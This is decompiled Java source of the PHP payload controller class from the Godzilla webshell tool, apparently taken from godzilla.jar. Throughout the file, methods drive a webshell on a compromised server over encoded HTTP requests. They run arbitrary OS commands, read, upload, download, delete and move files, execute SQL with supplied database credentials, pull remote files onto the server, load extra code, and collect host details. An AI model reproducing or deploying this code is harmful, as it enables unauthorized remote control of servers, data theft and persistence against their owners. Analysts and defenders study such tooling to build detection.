/*     */ package shells.payloads.php;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PayloadAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.shell.ShellEntity;
/*     */ import java.io.InputStream;
/*     */ import java.util.Map;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PayloadAnnotation(Name = "PhpDynamicPayload")
/*     */ public class PhpShell
/*     */   implements Payload {
/*     */   private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|canCallGzipDecode|canCallGzipEncode|systempdir) : (.+)";
/*  18 */   private static final String[] ALL_DATABASE_TYPE = new String[] { "mysql", "oracle", "sqlserver", "postgresql", "sqlite" };
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Encoding encoding;
/*     */   private String fileRoot;
/*     */   private String currentDir;
/*     */   private String currentUser;
/*     */   private String osInfo;
/*     */   private String basicsInfo;
/*     */   private String processArch;
/*     */   private String systempdir;
/*  29 */   private int gzipEncodeMagic = -1;
/*  30 */   private int gzipDecodeMagic = -1;
/*     */   
/*     */   private boolean isAlive;
/*     */   
/*     */   public void init(ShellEntity shellContext) {
/*  35 */     this.shell = shellContext;
/*  36 */     this.http = this.shell.getHttp();
/*  37 */     this.encoding = Encoding.getEncoding(this.shell);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getFile(String filePath) {
/*  43 */     ReqParameter parameters = new ReqParameter();
/*  44 */     parameters.add("dirName", this.encoding.Encoding((filePath.length() > 0) ? filePath : " "));
/*  45 */     return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] downloadFile(String fileName) {
/*  50 */     ReqParameter parameter = new ReqParameter();
/*  51 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/*  52 */     byte[] result = evalFunc(null, "readFileContent", parameter);
/*  53 */     return result;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getBasicsInfo() {
/*  58 */     if (this.basicsInfo == null) {
/*  59 */       ReqParameter parameter = new ReqParameter();
/*  60 */       this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", parameter));
/*     */     } 
/*  62 */     Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|canCallGzipDecode|canCallGzipEncode|systempdir) : (.+)");
/*  63 */     this.fileRoot = pxMap.get("FileRoot");
/*  64 */     this.currentDir = pxMap.get("CurrentDir");
/*  65 */     this.currentUser = pxMap.get("CurrentUser");
/*  66 */     this.osInfo = pxMap.get("OsInfo");
/*  67 */     this.processArch = pxMap.get("ProcessArch");
/*  68 */     this.systempdir = pxMap.get("systempdir");
/*  69 */     this.gzipDecodeMagic = functions.stringToint(pxMap.get("canCallGzipDecode"));
/*  70 */     this.gzipEncodeMagic = functions.stringToint(pxMap.get("canCallGzipEncode"));
/*  71 */     return this.basicsInfo;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean include(String codeName, byte[] binCode) {
/*  76 */     ReqParameter parameters = new ReqParameter();
/*  77 */     parameters.add("codeName", codeName);
/*  78 */     parameters.add("binCode", binCode);
/*  79 */     byte[] result = evalFunc(null, "includeCode", parameters);
/*  80 */     String resultString = (new String(result)).trim();
/*  81 */     if (resultString.equals("ok")) {
/*  82 */       return true;
/*     */     }
/*  84 */     Log.error(resultString);
/*  85 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void fillParameter(String className, String funcName, ReqParameter parameter) {
/*  91 */     if (className != null && className.trim().length() > 0) {
/*  92 */       parameter.add("codeName", className);
/*     */     }
/*  94 */     parameter.add("methodName", funcName);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
/* 100 */     fillParameter(className, funcName, parameter);
/* 101 */     byte[] data = parameter.formatEx();
/* 102 */     if (this.gzipDecodeMagic == 1) {
/* 103 */       data = functions.gzipE(data);
/*     */     }
/*     */     
/* 106 */     byte[] result = this.http.sendHttpResponse(data).getResult();
/* 107 */     if ((this.gzipEncodeMagic == -1 || this.gzipEncodeMagic == 1) && functions.isGzipStream(result)) {
/* 108 */       result = functions.gzipD(result);
/*     */     }
/* 110 */     return result;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean uploadFile(String fileName, byte[] data) {
/* 115 */     ReqParameter parameter = new ReqParameter();
/* 116 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 117 */     parameter.add("fileValue", data);
/* 118 */     byte[] result = evalFunc(null, "uploadFile", parameter);
/* 119 */     String stateString = this.encoding.Decoding(result);
/* 120 */     if ("ok".equals(stateString)) {
/* 121 */       return true;
/*     */     }
/* 123 */     Log.error(stateString);
/* 124 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean copyFile(String fileName, String newFile) {
/* 130 */     ReqParameter parameter = new ReqParameter();
/* 131 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 132 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 133 */     byte[] result = evalFunc(null, "copyFile", parameter);
/* 134 */     String stateString = this.encoding.Decoding(result);
/* 135 */     if ("ok".equals(stateString)) {
/* 136 */       return true;
/*     */     }
/* 138 */     Log.error(stateString);
/* 139 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean deleteFile(String fileName) {
/* 145 */     ReqParameter parameter = new ReqParameter();
/* 146 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 147 */     byte[] result = evalFunc(null, "deleteFile", parameter);
/* 148 */     String stateString = this.encoding.Decoding(result);
/* 149 */     if ("ok".equals(stateString)) {
/* 150 */       return true;
/*     */     }
/* 152 */     Log.error(stateString);
/* 153 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean newFile(String fileName) {
/* 158 */     ReqParameter parameter = new ReqParameter();
/* 159 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 160 */     byte[] result = evalFunc(null, "newFile", parameter);
/* 161 */     String stateString = this.encoding.Decoding(result);
/* 162 */     if ("ok".equals(stateString)) {
/* 163 */       return true;
/*     */     }
/* 165 */     Log.error(stateString);
/* 166 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean newDir(String fileName) {
/* 172 */     ReqParameter parameter = new ReqParameter();
/* 173 */     parameter.add("dirName", this.encoding.Encoding(fileName));
/* 174 */     byte[] result = evalFunc(null, "newDir", parameter);
/* 175 */     String stateString = this.encoding.Decoding(result);
/* 176 */     if ("ok".equals(stateString)) {
/* 177 */       return true;
/*     */     }
/* 179 */     Log.error(stateString);
/* 180 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, Map options, String execSql) {
/* 187 */     ReqParameter parameter = new ReqParameter();
/* 188 */     parameter.add("dbType", dbType);
/* 189 */     parameter.add("dbHost", dbHost);
/* 190 */     parameter.add("dbPort", Integer.toString(dbPort));
/* 191 */     parameter.add("dbUsername", dbUsername);
/* 192 */     parameter.add("dbPassword", dbPassword);
/* 193 */     parameter.add("execType", execType);
/* 194 */     parameter.add("execSql", this.shell.getDbEncodingModule().Encoding(execSql));
/* 195 */     if (options != null) {
/* 196 */       String dbCharset = (String)options.get("dbCharset");
/* 197 */       String currentDb = (String)options.get("currentDb");
/* 198 */       if (dbCharset != null) {
/* 199 */         parameter.add("dbCharset", dbCharset);
/* 200 */         parameter.add("execSql", Encoding.getEncoding(dbCharset).Encoding(execSql));
/*     */       } 
/* 202 */       if (currentDb != null) {
/* 203 */         parameter.add("currentDb", currentDb);
/*     */       }
/*     */     } 
/* 206 */     byte[] result = evalFunc(null, "execSql", parameter);
/* 207 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String currentDir() {
/* 212 */     if (this.currentDir != null) {
/* 213 */       return functions.formatDir(this.currentDir);
/*     */     }
/* 215 */     getBasicsInfo();
/* 216 */     return functions.formatDir(this.currentDir);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean test() {
/* 222 */     ReqParameter parameter = new ReqParameter();
/* 223 */     byte[] result = evalFunc(null, "test", parameter);
/* 224 */     String codeString = new String(result);
/* 225 */     if (codeString.trim().equals("ok")) {
/* 226 */       this.isAlive = true;
/* 227 */       return true;
/*     */     } 
/* 229 */     Log.error(codeString);
/* 230 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String currentUserName() {
/* 236 */     if (this.currentUser != null) {
/* 237 */       return this.currentUser;
/*     */     }
/* 239 */     getBasicsInfo();
/* 240 */     return this.currentUser;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String bigFileUpload(String fileName, int position, byte[] content) {
/* 246 */     ReqParameter reqParameter = new ReqParameter();
/* 247 */     reqParameter.add("fileContents", content);
/* 248 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 249 */     reqParameter.add("position", String.valueOf(position));
/* 250 */     byte[] result = evalFunc(null, "bigFileUpload", reqParameter);
/* 251 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String getTempDirectory() {
/* 256 */     if (this.systempdir != null) {
/* 257 */       return this.systempdir;
/*     */     }
/* 259 */     if (isWindows()) {
/* 260 */       return "c:/windows/temp/";
/*     */     }
/* 262 */     return "/tmp/";
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
/* 269 */     ReqParameter reqParameter = new ReqParameter();
/* 270 */     reqParameter.add("position", String.valueOf(position));
/* 271 */     reqParameter.add("readByteNum", String.valueOf(readByteNum));
/* 272 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 273 */     reqParameter.add("mode", "read");
/* 274 */     return evalFunc(null, "bigFileDownload", reqParameter);
/*     */   }
/*     */ 
/*     */   
/*     */   public int getFileSize(String fileName) {
/* 279 */     ReqParameter reqParameter = new ReqParameter();
/* 280 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 281 */     reqParameter.add("mode", "fileSize");
/* 282 */     byte[] result = evalFunc(null, "bigFileDownload", reqParameter);
/* 283 */     String ret = this.encoding.Decoding(result);
/*     */     try {
/* 285 */       return Integer.parseInt(ret);
/* 286 */     } catch (Exception e) {
/* 287 */       Log.error(e);
/* 288 */       Log.error(ret);
/*     */       
/* 290 */       return -1;
/*     */     } 
/*     */   }
/*     */   
/*     */   public boolean isWindows() {
/* 295 */     return (currentDir().charAt(0) != '/');
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isAlive() {
/* 300 */     return this.isAlive;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isX64() {
/* 305 */     return this.processArch.contains("64");
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String[] listFileRoot() {
/* 311 */     if (this.fileRoot != null) {
/* 312 */       return this.fileRoot.split(";");
/*     */     }
/* 314 */     getBasicsInfo();
/* 315 */     return this.fileRoot.split(";");
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String execCommand(String commandStr) {
/* 321 */     ReqParameter parameter = new ReqParameter();
/* 322 */     parameter.add("cmdLine", this.encoding.Encoding(commandStr.trim()));
/* 323 */     byte[] result = evalFunc(null, "execCommand", parameter);
/* 324 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getOsInfo() {
/* 330 */     if (this.osInfo != null) {
/* 331 */       return this.osInfo;
/*     */     }
/* 333 */     getBasicsInfo();
/* 334 */     return this.osInfo;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String[] getAllDatabaseType() {
/* 341 */     return ALL_DATABASE_TYPE;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean moveFile(String fileName, String newFile) {
/* 346 */     ReqParameter parameter = new ReqParameter();
/* 347 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 348 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 349 */     byte[] result = evalFunc(null, "moveFile", parameter);
/* 350 */     String stasteString = this.encoding.Decoding(result);
/* 351 */     if ("ok".equals(stasteString)) {
/* 352 */       return true;
/*     */     }
/* 354 */     Log.error(stasteString);
/* 355 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] getPayload() {
/* 362 */     byte[] data = null;
/*     */     try {
/* 364 */       InputStream fileInputStream = PhpShell.class.getResourceAsStream("assets/payload.php");
/* 365 */       data = functions.readInputStream(fileInputStream);
/* 366 */       fileInputStream.close();
/* 367 */     } catch (Exception e) {
/* 368 */       Log.error(e);
/*     */     } 
/* 370 */     return data;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean fileRemoteDown(String url, String saveFile) {
/* 375 */     ReqParameter reqParameter = new ReqParameter();
/* 376 */     reqParameter.add("url", this.encoding.Encoding(url));
/* 377 */     reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
/* 378 */     String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
/* 379 */     if ("ok".equals(result)) {
/* 380 */       return true;
/*     */     }
/* 382 */     Log.error(result);
/* 383 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean setFileAttr(String file, String type, String fileAttr) {
/* 389 */     ReqParameter reqParameter = new ReqParameter();
/* 390 */     reqParameter.add("type", type);
/* 391 */     reqParameter.add("fileName", this.encoding.Encoding(file));
/* 392 */     reqParameter.add("attr", fileAttr);
/* 393 */     String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
/* 394 */     if ("ok".equals(result)) {
/* 395 */       return true;
/*     */     }
/* 397 */     Log.error(result);
/* 398 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean close() {
/* 404 */     this.isAlive = false;
/* 405 */     ReqParameter reqParameter = new ReqParameter();
/* 406 */     String result = this.encoding.Decoding(evalFunc(null, "g_close", reqParameter));
/* 407 */     if ("ok".equals(result)) {
/* 408 */       return true;
/*     */     }
/* 410 */     Log.error(result);
/* 411 */     return false;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\php\PhpShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */